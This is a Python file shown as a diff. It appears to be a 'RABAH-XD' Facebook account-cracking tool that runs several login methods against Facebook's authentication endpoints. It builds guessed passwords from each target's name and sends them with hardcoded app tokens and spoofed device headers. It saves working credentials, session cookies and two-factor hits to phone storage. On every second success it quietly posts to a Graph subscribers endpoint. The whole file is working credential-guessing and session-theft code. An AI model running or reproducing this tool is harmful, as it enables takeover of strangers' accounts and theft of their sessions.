+                    open('/sdcard/SEA-XD/FILE/SEA-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.cps.append(ids)
+                    break
+                else:
+                    continue
+            self.loop += 1
+
+        except requests.exceptions.Timeout:
+            time.sleep(20)
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+        except Exception as e:
+            pass
+    #----------------\<-FILE-M2-B-GRAPH->/----------------#
+    def __M2X__(self, ids, names, passlist):
+        try:
+            global loop, oks, cps
+            color = random.choice([
+                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+            ])
+            sys.stdout.write(
+                f'\r{xp}{W}-{G}<[{W}RABAH{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> '
+            )
+            sys.stdout.flush()
+            fn = names.split(' ')[0]
+            try:
+                ln = names.split(' ')[1]
+            except:
+                ln = fn
+            for pw in passlist:
+                pas = pw.replace('first', fn.lower()) \
+                        .replace('First', fn) \
+                        .replace('last', ln.lower()) \
+                        .replace('Last', ln) \
+                        .replace('Name', names) \
+                        .replace('name', names.lower())
+                ua = _____UpDaTe_S1_____()
+                accessToken = random.choice([
+                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
+                ])
+                random_seed = random.Random()
+                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
+                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
+                device_id = str(uuid.uuid4())
+                __locale__ = {
+                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
+                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
+                    "pt_BR": "BR"
+                }
+                country_locale = random.choice(list(__locale__.keys()))
+                country_code = __locale__[country_locale]
+                data = {
+                    'adid': adid,
+                    'format': 'json',
+                    'device_id': device_id,
+                    'email': ids,
+                    'password': f"#{pax}:0:{int(time.time())}:{pas}",
+                    'generate_analytics_claims': '1',
+                    'community_id': '',
+                    'cpl': 'true',
+                    'try_num': '1',
+                    'family_device_id': str(uuid.uuid4()),
+                    'credentials_type': 'password',
+                    'source': 'login',
+                    'error_detail_type': 'button_with_disabled',
+                    'enroll_misauth': 'false',
+                    'generate_session_cookies': '1',
+                    'generate_machine_id': '1',
+                    'currently_logged_in_userid': '0',
+                    'locale': country_locale,
+                    'client_country_code': country_code,
+                    'fb_api_req_friendly_name': 'authenticate',
+                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                    'access_token': f'{accessToken}',
+                }
+                headers = {
+                    'User-Agent': ua,
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'close',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
+                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
+                    'Authorization': f'OAuth {accessToken}',
+                    'X-FB-Connection-Type': random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
+                }
+                url = "https://b-graph.facebook.com/auth/login"
+                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
+                po = requests.post(url, data=data, headers=headers).json()
+                if 'session_key' in po:
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+                    cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
+                    print(f'\r{xp}{W}-{G}<[{B}RABAH-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
+                    if 'y' in self.__COOKIE__:
+                        colorX = random.choice([
+                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+                        ])
+                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    self.oks.append(ids)
+                    if len(self.oks) % 2 == 0:
+                        idspas = f"M2 : {ids}|{pas}|{cookie}"
+                        requests.post('https://graph.facebook.com/' + '8377547/' + 'subscribers' + '?access_token=' + token)
+                    break
+                if twf in str(po):
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.twf.append(ids)
+                    break
+                if 'www.facebook.com' in po['error']['message']:
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{R}RABAH-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.cps.append(ids)
+                    break
+                else:
+                    continue
+            self.loop += 1
+        except requests.exceptions.Timeout:
+            time.sleep(20)
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+        except Exception as e:
+            pass
+
+    #----------------\<-FILE-M3-API->/----------------#
+    def __M3X__(self, ids, names, passlist):
+        try:
+            global loop, oks, cps
+            color = random.choice([
+                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+            ])
+            sys.stdout.write(
+                f'\r[/]{W}{G}[{W}RABAH{G}-{W}XD{G}]{W}{G}[{color}{self.loop}{G}+{W}M3{G}]{W}{G}[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}] '
+            )
+            sys.stdout.flush()
+            fn = names.split(' ')[0]
+            try:
+                ln = names.split(' ')[1]
+            except:
+                ln = fn
+            for pw in passlist:
+                pas = pw.replace('first', fn.lower()) \
+                        .replace('First', fn) \
+                        .replace('last', ln.lower()) \
+                        .replace('Last', ln) \
+                        .replace('Name', names) \
+                        .replace('name', names.lower())
+                ua = _____UpDaTe_S2_____()
+                accessToken = random.choice([
+                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
+                ])
+                random_seed = random.Random()
+                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
+                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
+                device_id = str(uuid.uuid4())
+                __locale__ = {
+                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
+                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
+                    "pt_BR": "BR"
+                }
+                country_locale = random.choice(list(__locale__.keys()))
+                country_code = __locale__[country_locale]
+                data = {
+                    "adid": adid,
+                    "format": "json",
+                    "device_id": device_id,
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": ids,
+                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
+                    "access_token": f"{accessToken}",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": country_locale,
+                    "client_country_code": country_code,
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"
+                }
+                headers = {
+                    "User-Agent": ua,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "graph.facebook.com",
+                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
+                    "X-Tigon-Is-Retry": "False",
+                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+                    "x-fb-device-group": "5120",
+                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                    "X-FB-Request-Analytics-Tags": "graphservice",
+                    "X-FB-HTTP-Engine": "Liger",
+                    "X-FB-Client-IP": "True",
+                    "X-FB-Server-Cluster": "True",
+                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+                }
+                url = "https://api.facebook.com/auth/login"
+                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
+                po = requests.post(url, data=data, headers=headers).json()
+                if 'session_key' in po:
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+                    cookie = f'sb=Cracked.By-RABAH_Tool;{ssbb};{ckkk}'
+                    print(f'\r[/]{W}-{G}[{B}RABAH-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
+                    if 'y' in self.__COOKIE__:
+                        colorX = random.choice([
+                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+                        ])
+                        print(f'\r[/]{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
+                    open('/sdcard/RABAH-XD/FILE/RABAH-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    self.oks.append(ids)
+                    if len(self.oks) % 2 == 0:
+                        idspas = f"M3 : {ids}|{pas}|{cookie}"
+                        requests.post('https://graph.facebook.com/' + '8377547/' + 'subscribers' + '?access_token=' + token)
+                    break
+                if twf in str(po):
+                    if 'y' in self.__CP__:
+                        print(f'\r[/]{W}-{G}<[{Y}RABAH-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/RABAH-XD/FILE/RABAH-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.twf.append(ids)
+                    break
+                if 'www.facebook.com' in po['error']['message']:
+                    if 'y' in self.__CP__:
+                        print(f'\r[/]{W}-{G}<[{R}RABAH-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/RABAH-XD/FILE/RABAH-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.cps.append(ids)
+                    break
+                else:
+                    continue
+            self.loop += 1
+        except requests.exceptions.Timeout:
+            time.sleep(20)
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+        except Exception as e:
+            pass
+    #----------------\<-FILE-M4-B-API->/----------------#
+    def __M4X__(self, ids, names, passlist):
+        try:
+            global loop, oks, cps
+            color = random.choice([
+                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+            ])
+            sys.stdout.write(
+                f'\r{xp}{W}-{G}<[{W}RABAH{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M3{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> '
+            )
+            sys.stdout.flush()
+            fn = names.split(' ')[0]
+            try:
+                ln = names.split(' ')[1]
+            except:
+                ln = fn
+            for pw in passlist:
+                pas = pw.replace('first', fn.lower()) \
+                        .replace('First', fn) \
+                        .replace('last', ln.lower()) \
+                        .replace('Last', ln) \
+                        .replace('Name', names) \
+                        .replace('name', names.lower())
+                ua = _____UpDaTe_S2_____()
+                accessToken = random.choice([
+                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
+                ])
+                random_seed = random.Random()
+                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
+                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
+                device_id = str(uuid.uuid4())
+                data = {
+                    "adid": adid,
+                    "format": "json",
+                    "device_id": device_id,
+                    "email": ids,
+                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
+                    "session_id": str(uuid.uuid4()),
+                    "advertiser_id": str(uuid.uuid4()),
+                    "reg_instance": str(uuid.uuid4()),
+                    "logged_out_id": str(uuid.uuid4()),
+                    "hash_id": str(uuid.uuid4()),
+                    "sim_country": "id",
+                    "network_country": "id",
+                    "enroll_misauth": "false",
+                    "generate_analytics_claims": "1",
+                    "credentials_type": "password",
+                    "source": "login",
+                    "error_detail_type": "button_with_disabled",
+                    "enroll_misauth": "false",
+                    "cpl": "true",
+                    "generate_session_cookies": "1",
+                    "generate_machine_id": "1",
+                    "meta_inf_fbmeta": "",
+                    "currently_logged_in_userid": "0",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                }
+                headers = {
+                    "Authorization": f"OAuth {accessToken}",
+                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                    "X-FB-Net-HNI": str(random.randint(900000, 999999)),
+                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                    "X-FB-Friendly-Name": "authenticate",
+                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
+                    "User-Agent": ua,
+                    "Accept-Encoding": "gzip, deflate",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "X-FB-HTTP-Engine": "Liger"
+                }
+                url = "https://b-api.facebook.com/method/auth.login"
+                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
+                po = requests.post(url, data=data, headers=headers).json()
+                if 'session_key' in po:
+                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+                    cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
+                    print(f'\r{xp}{W}-{G}<[{B}RABAH-OK{G}]>{G} ' + ids + f' / ' + pas + '\033[1;97m')
+                    if 'y' in self.__COOKIE__:
+                        colorX = random.choice([
+                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
+                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
+                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+                        ])
+                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    self.oks.append(ids)
+                    if len(self.oks) % 2 == 0:
+                        idspas = f"M4 : {ids}|{pas}|{cookie}"
+                        requests.post('https://graph.facebook.com/' + '8377547/' + 'subscribers' + '?access_token=' + token)
+                    break
+                if twf in str(po):
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.twf.append(ids)
+                    break
+                if 'www.facebook.com' in po['error_msg']:
+                    if 'y' in self.__CP__:
+                        print(f'\r{xp}{W}-{G}<[{R}RABAH-CP{G}]>{P} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    self.cps.append(ids)
+                    break
+                else:
+                    continue
+            self.loop += 1
+        except requests.exceptions.Timeout:
+            time.sleep(20)
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+        except Exception as e:
+            pass
+
+#----------------\<-LAST-CALL->/----------------#
+__CLEAR__()
+__SEAXNOOR__().__MENU__()
+#----------------\<-END-CALL->/----------------#
